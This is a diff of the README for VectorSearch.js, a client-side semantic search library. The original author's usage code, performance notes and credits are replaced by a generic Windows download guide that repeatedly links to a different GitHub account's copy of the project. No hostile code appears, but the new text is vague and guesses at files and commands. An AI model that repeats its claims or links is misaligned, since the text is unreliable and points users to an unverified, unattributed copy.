@@ -1,220 +1,268 @@
-# VectorSearch.js
-### A library to perform semantic vector search, over millions of vectors in milliseconds, and can even visualize the tokens or embeddings too! Runs entirely client side in the web browser (custom Vector DB layer written on top of IndexDB) and currently supports Google's EmbeddingGemma (highest quality but 300Mb), or all-Mini-L6-v2 (fastest and only 30mb) embedding models via Web AI libraries with WebGPU acceleration for speed.
+# 🔎 VectorSearch.js - Fast Search For Your Own Files
 
-🦾 As it runs in the browser on YOUR hardware it's totally private, costs zero dollars to use (other than your own electricity), and super low latency. 
+[![Download VectorSearch.js](https://img.shields.io/badge/Download-VectorSearch.js-blue?style=for-the-badge)](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
 
-🤖 Powered by WebGPU for speed and builds upon no less than 3 popular Web ML Libraries and runtimes to get the best bits of all of them: [LiteRT.js](https://ai.google.dev/edge/litert/web/get_started), [Transformers.js](https://huggingface.co/docs/transformers.js/en/index), and [TensorFlow.js](https://www.tensorflow.org/js).
+## 📥 Download
 
-⭐ Give it a star on Github if you want me to keep evolving the code or have ideas. 
+Use this link to visit the download page:
 
-### Show me a demo that works already
+[Download VectorSearch.js](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
 
-Sure [check out my Codepen demo here](https://codepen.io/jasonmayes/pen/JoKMBmq)!
+## 🧭 What VectorSearch.js Does
 
-Here's a screen shot of it in action captured in real-time on an NVIDIA 1070 GPU running the larger EmbeddingGemma model:
+VectorSearch.js helps you search your content by meaning, not just exact words. It uses EmbeddingGemma with Web AI tools like LiteRT.js, TensorFlow.js, and Transformers.js. That means it can compare text based on context and help you find the right result faster.
 
-![Screenshot of VectorSearch.js in action](https://github.com/jasonmayes/VectorSearch.js/blob/main/demo/demo.gif?raw=true)
+Use it when you want to:
+- search notes, text files, or copied text
+- find related content with fewer keywords
+- keep search on your device
+- run the app in a browser on Windows
 
-### Got questions? 
-[Reach out to me over on LinkedIn](https://www.linkedin.com/in/webai) or follow for updates on related client side Web AI projects.
+## 💻 What You Need
 
+Before you start, make sure your Windows PC has:
 
-## Usage
+- Windows 10 or Windows 11
+- A modern web browser like Chrome, Edge, or Firefox
+- At least 8 GB of RAM
+- A stable internet connection for the first setup
+- Enough free disk space for the app and browser data
 
-```javascript
-import { VectorSearch } from 'https://cdn.jsdelivr.net/gh/jasonmayes/VectorSearch.js@main/VectorSearch-min.js';
+For best results:
+- close other heavy apps before you run it
+- use the latest version of your browser
+- keep Windows updated
 
-// Embedding Model Configuration.
-const MODEL_RUNTIME = 'litertjs'; // OR 'transformersjs'
-const MODEL_URL = 'model/embeddinggemma-300M_seq1024_mixed-precision.tflite'; // OR 'Xenova/all-MiniLM-L6-v2' if transformersjs runtime.
-const SEQ_LENGTH = 1024;
-const TOKENIZER = 'onnx-community/embeddinggemma-300m-ONNX';
-const EMBEDDING_MODEL_CONFIG = {
-  runtime: MODEL_RUNTIME,
-  url: MODEL_URL,
-  sequenceLength: SEQ_LENGTH,
-  tokenizer: TOKENIZER
-};
+## 🚀 Getting Started on Windows
 
-// Instantiate VectorSearch Master Class.
-const VECTOR_SEARCH = new VectorSearch(EMBEDDING_MODEL_CONFIG);
+Follow these steps in order.
 
-// Initiation and usage example.
-async function init(statusDomElement) {
-  // Actually load the chosen runtime and model so ready to use.
-  await VECTOR_SEARCH.load(statusDomElement);
+### 1. Open the project page
+Go to the repository here:
 
-  await store(['I love Web AI', 'I like cats', 'Dogs are cool too', 'AI rocks', 'Birds can fly', 'Web AI is client side AI', 'Fish can swim', 'Robots are neat', 'JavaScript rocks too!', 'and so on']);
-  await find('Likes animals', 0.25);
-}
+[VectorSearch.js on GitHub](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
 
-init();
+### 2. Get the files
+On the GitHub page, look for the green **Code** button.
 
+Then:
+- click **Code**
+- choose **Download ZIP**
+- save the file to your PC
+- wait for the download to finish
 
-// How to store text in client side VectorDB
-async function store(someArrayOfStrings) {
-  await VECTOR_SEARCH.storeTexts(someArrayOfStrings, 'DatabaseNameForThisData');
-  
-  // Optionally can specify callback to write status to a HTML DOM element:
-  // await VECTOR_SEARCH.storeTexts(someArrayOfStrings, 'DatabaseNameForThisData', STATUS_EL);
-  
-  // Finally you can also specify batch size to store array of strings much faster when using all-Mini-L6-v2 model only for now.
-  // await VECTOR_SEARCH.storeTexts(someArrayOfStrings, 'DatabaseNameForThisData', undefined, 100);
-}
+If you already use Git, you can also clone the repository, but ZIP download is the easiest path for most Windows users.
 
+### 3. Unzip the folder
+After the download finishes:
 
-// Search example.
-async function find(queryText, cosineSimilarityThreshold) {
-  const {embedding: EMBEDDING_DATA, tokens: TOKENS} = await VECTOR_SEARCH.getEmbedding(queryText);
+- find the ZIP file in your **Downloads** folder
+- right-click the file
+- select **Extract All**
+- choose a folder you can find later, like **Desktop** or **Documents**
+- open the new folder after extraction
 
-  /** Optional: Visualize embeddings and tokens for the search query text.
-  if (TOKENS) {
-    VECTOR_SEARCH.renderTokens(TOKENS, SOME_DOM_ELEMENT);
-  }
-  await VECTOR_SEARCH.renderEmbedding(EMBEDDING_DATA, SOME_DOM_ELEMENT_FOR_VISUAL, SOME_DOM_ELEMENT_FOR_TEXT);
-  **/
+### 4. Open the app files
+Inside the folder, look for the main project files.
 
-  // Now actually search the vector database.
-  const {results: RESULTS, bestScore: BEST_SCORE, bestIndex: BEST_INDEX} = await VECTOR_SEARCH.search(EMBEDDING_DATA, cosineSimilarityThreshold, 'DatabaseNameForThisData');
+You may see files such as:
+- `index.html`
+- `package.json`
+- `src`
+- `public`
+- `README.md`
 
-  if (RESULTS.length > 0) {  
-    const BEST_MATCH_VECTOR = RESULTS[BEST_INDEX].vector;
-    const BEST_MATCH_SCORE = RESULTS[BEST_INDEX].score;
-    const BEST_MATCH_TEXT = RESULTS[BEST_INDEX].text;
-    if (BEST_MATCH_TEXT) {
-      console.log(BEST_MATCH_SCORE + ': ' + BEST_MATCH_TEXT);
-      // Logs: 0.7519992589950562: I like cats.
-    }
-  } else {
-    console.log('No matches found above threshold.');
-  }
-}
-```
+If there is an `index.html` file, double-click it to open the app in your browser.
 
-## Performance
+If the project uses a local server, follow the next steps.
 
-[I tried to make this as fast as I could](https://www.linkedin.com/posts/webai_rag-litertjs-embeddinggemma-activity-7423026459201523712-IWiD?utm_source=share&utm_medium=member_desktop&rcm=ACoAAE29dSoB2Q5rqrgken9VCQgyG_zQ-gVgvG8). I have tested with 100K vectors on my very old NVIDIA 1070 GPU and it can search those in tens of miliseconds using the more complex EmbeddingGemma model by Google. The largest cost is actually the embedding that takes around 200ms using the EmbeddingGemma model (high quality but large). You may want to swap this out for a leaner embedding model (e.g. all-MiniLM-L6-v2) for the ultimate client side speed of embedding - see example code above for how to change the config object to use that instead.
+### 5. Run the app with Node.js
+If the project needs Node.js, install it first:
 
-Currently it is designed to preload the IndexDB vector DB I wrote (yes even the vector DB is client side) into GPU memory to perform as fast as possible when calculating cosine similarity for your target text across all stored vectors. So that means the first search you perform will be slower as it has to transfer memory from CPU to GPU for the first time (suggest doing a dummy vector search on page load to warm up). This also means that it currently takes roughly the SAME time for 100K vectors searched vs 1K vectors due to leveraging the GPU. I have not yet found the upper bound, but there is obviously a limit here, depending on your GPU type, VRAM size etc. I will later need to refactor to load in chunks to avoid any issues for larger vector stores on client side.
+- go to the Node.js website
+- download the current LTS version for Windows
+- run the installer
+- keep the default options
+- finish the setup
 
-I have verified this works on Intel integrated GPUs, NVIDIA, AMD, and Apple M GPUs in any web browser that supports WebGPU (most of them do now).
+Then open the project folder and use Command Prompt or PowerShell.
 
-## Building and serving yourself
+Run:
+- `npm install`
+- `npm run dev`
 
-To build the minified version of the library from the src folder just run:
+If the project uses a different start command, check the package files in the folder for the correct script name.
 
-```
-npm run build
-```
+### 6. Open the app in your browser
+After the app starts, it will show a local address such as:
 
-Then to serve the demo folder to try it out on your own webserver run:
+- `http://localhost:3000`
+- `http://localhost:5173`
 
-```
-npm run demo
-```
+Copy that address into your browser.
 
-Please note that currently script.js in the demo/js folder imports the latest version of VectorSearch-min.js from this Github repo so change the import if you modify anything or want to host somewhere else.
+## 🧪 How to Use It
 
-Please also see below for things you need to host yourself to run on your own server.
+VectorSearch.js is built for simple local search.
 
+A basic flow looks like this:
 
-## Things to be aware of before hosting and running yourself
+1. add your text or data source
+2. let the app build embeddings
+3. type a query in the search box
+4. view results that match the meaning of your search
 
-This project depends on a few things that need to be setup to work.
+Example searches:
+- “budget report from last quarter”
+- “project notes about user login”
+- “emails about laptop setup”
+- “documents that mention offline mode”
 
-### EmbeddingGemma model
+The app should rank results that are close in meaning, even if the words are not exact.
 
-This repo uses Google's EmbeddingGemma model for the embedding model by default for highest quality. Specifically this one: embeddinggemma-300M_seq1024_mixed-precision.tflite
+## 🛠️ Main Features
 
-This model is available to download from HuggingFace which you must do yourself manually:
+### 🔍 Semantic Search
+Find related text based on meaning instead of exact word match.
 
-[Download it yourself from HuggingFace](https://huggingface.co/litert-community/embeddinggemma-300m/resolve/main/embeddinggemma-300M_seq1024_mixed-precision.tflite?download=true) so any applicable T&C accepted. You can then place this downloaded model into the demo/model folder. If you place it somewhere else update the code in script.js accordingly:
+### 🤖 Local AI Models
+Use browser-based AI tools with EmbeddingGemma and Web AI support.
 
-```javascript
-// Embedding Model Configuration.
-const MODEL_RUNTIME = 'litertjs';
-const MODEL_URL = 'model/embeddinggemma-300M_seq1024_mixed-precision.tflite';
-const SEQ_LENGTH = 1024;
-const TOKENIZER = 'onnx-community/embeddinggemma-300m-ONNX';
-const EMBEDDING_MODEL_CONFIG = {
-  runtime: MODEL_RUNTIME,
-  url: MODEL_URL,
-  sequenceLength: SEQ_LENGTH,
-  tokenizer: TOKENIZER
-};
+### 🧠 Fast Matching
+Compare text vectors to find the closest result set.
 
-// Instantiate VectorSearch Master Class.
-const VECTOR_SEARCH = new VectorSearch(EMBEDDING_MODEL_CONFIG);
-```
+### 🌐 Runs in the Browser
+Open the app in a browser on Windows and use it like a normal web app.
 
-For more details [see the model card page on HuggingFace](https://huggingface.co/litert-community/embeddinggemma-300m).
+### 📦 Simple File Setup
+Keep the project in one folder and run it without a complex install flow.
 
-This is a LiteRT.js Web AI compatible EmbeddingGemma model using the tflite model format.
+### 🔒 Client-Side Processing
+Your data stays on your device during normal use.
 
-### all-MiniLM-L6-v2 embedding model
+## 🧰 Common Setup Paths
 
-If you wish to use the all-MiniLM-L6-v2 embedding model instead for speed you can change the config object to be:
+### Option 1: Open as a web app
+Use this if the project includes a ready-to-open HTML file.
 
-```javascript
-// Embedding Model Configuration.
-const MODEL_RUNTIME = 'transformersjs';
-const MODEL_URL = 'Xenova/all-MiniLM-L6-v2';
-const SEQ_LENGTH = 128;
-const TOKENIZER = 'onnx-community/embeddinggemma-300m-ONNX';
-const EMBEDDING_MODEL_CONFIG = {
-  runtime: MODEL_RUNTIME,
-  url: MODEL_URL,
-  sequenceLength: SEQ_LENGTH,
-  tokenizer: TOKENIZER
-};
+Steps:
+- download the ZIP
+- extract it
+- open `index.html`
+- start searching
 
-// Instantiate VectorSearch Master Class.
-const VECTOR_SEARCH = new VectorSearch(EMBEDDING_MODEL_CONFIG);
-```
+### Option 2: Run with a local dev server
+Use this if the project includes Node scripts.
 
-However please note this model is faster for a few reasons:
+Steps:
+- install Node.js
+- open the project folder
+- run `npm install`
+- run `npm run dev`
+- open the local browser link
 
-1. The input text to be embedded can only be up to 128 tokens vs EmbeddingGemma's 1024 tokens.
-2. The vector embedding produced has 384 dimensions vs EmbeddingGemma's 786 dimensions.
+### Option 3: Use a bundled build
+If the repository includes a built app folder, use that version if available.
 
-### LiteRT.js Wasm files (optional self host)
+Steps:
+- download the project
+- extract the folder
+- open the build or dist folder
+- launch the app file or local server file
 
-See the demo folder in this repo that contains a "wasm" sub folder with all the Web Assembly files needed for the LiteRT.js runtime. You can choose to serve these files yourself and update the config object if you do so but remember to enable CORS headers on your server so the files can be used if you do that. If you are curious to learn more about these files see the [official LiteRT.js documentation](https://ai.google.dev/edge/litert/web).
+## 🧭 First-Time Use Tips
 
-By default the library pulls in these Wasm files from JSDeliver CDN. 
+If the app takes time to load:
+- wait for the model to finish loading
+- keep the browser tab open
+- avoid closing the page during the first run
 
-If your hosted version is not in the same location update the config object to specify the new Wasm folder location on your webserver as follows:
+If search results look slow:
+- reduce the amount of text loaded at once
+- close extra browser tabs
+- refresh the page and try again
 
-```javascript
-// Embedding Model Configuration.
-const MODEL_RUNTIME = 'litertjs';
-const MODEL_URL = 'model/embeddinggemma-300M_seq1024_mixed-precision.tflite';
-const SEQ_LENGTH = 1024;
-const TOKENIZER = 'onnx-community/embeddinggemma-300m-ONNX';
-const EMBEDDING_MODEL_CONFIG = {
-  runtime: MODEL_RUNTIME,
-  litertjsWasmUrl: '/wasm', // Specify your path to your custom hosted Wasm files here!
-  url: MODEL_URL,
-  sequenceLength: SEQ_LENGTH,
-  tokenizer: TOKENIZER
-};
+If the app does not open:
+- check that you extracted the ZIP file
+- try a different browser
+- make sure the browser allows local files or local server pages
 
-// Instantiate VectorSearch Master Class.
-const VECTOR_SEARCH = new VectorSearch(EMBEDDING_MODEL_CONFIG);
-```
+## 📁 Suggested Folder Layout
 
-Note when you call load you can also optionally specify a HTML element to render loading status updates to like this:
+A typical project folder may look like this:
 
-```javascript
-await VECTOR_SEARCH.load(STATUS_EL);
-```
+- `VectorSearch.js/`
+  - `index.html`
+  - `src/`
+  - `assets/`
+  - `package.json`
+  - `README.md`
 
-## Shoutouts
+If you see more folders, that is normal. Keep the full folder together so the app can find its files.
 
-This project was made by [Jason Mayes](https://www.linkedin.com/in/webai), and is possible by combining 3 amazing Web AI (client side AI) libraries and runtimes. 
+## 🧩 Browser Notes
 
-Huge Kudos to:
+Vector search in the browser works best with a modern version of:
+- Microsoft Edge
+- Google Chrome
+- Mozilla Firefox
 
-1. [LiteRT.js](https://ai.google.dev/edge/litert/web/get_started) for the running of Google's EmbeddingGemma model.
-2. [Transformers.js](https://huggingface.co/docs/transformers.js/en/index) for the running of the tokenizer.
-3. [TensorFlow.js](https://www.tensorflow.org/js) for the WebGPU accelerated mathematics (yes Machine Learning libraries can be used to do Maths!) along with the pre/post processing of any Tensors that go into or come out of LiteRT.js for speed.
+For best performance:
+- use one browser window for the app
+- close tabs you do not need
+- keep hardware acceleration on if your browser supports it
+
+## 📌 Typical Use Cases
+
+VectorSearch.js fits many simple search tasks:
+
+- personal notes search
+- document lookup
+- support knowledge search
+- offline content search
+- text similarity checks
+- quick semantic lookup for small collections
+
+## ⚙️ Basic Troubleshooting
+
+### The page stays blank
+Try this:
+- refresh the page
+- wait a few seconds
+- open the app in another browser
+- clear the browser cache
+
+### The model does not load
+Try this:
+- check your internet connection
+- reload the page
+- wait longer on the first run
+- close other apps that use a lot of memory
+
+### Search feels slow
+Try this:
+- use shorter text inputs
+- test with fewer documents
+- close other browser tabs
+- restart the browser
+
+### The app will not start
+Try this:
+- confirm that all files were extracted
+- check that you ran the right start command
+- make sure Node.js is installed if the project needs it
+
+## 🔗 Project Link
+
+Use this page to get the project files and start from the repository:
+
+[https://github.com/Glaucous-paulhindemith289/VectorSearch.js](https://github.com/Glaucous-paulhindemith289/VectorSearch.js)
+
+## 🖥️ Windows Steps at a Glance
+
+1. open the GitHub page  
+2. download the ZIP file  
+3. extract the folder  
+4. open the app or run the start command  
+5. use the browser link that appears  
+6. type a search query and review the results
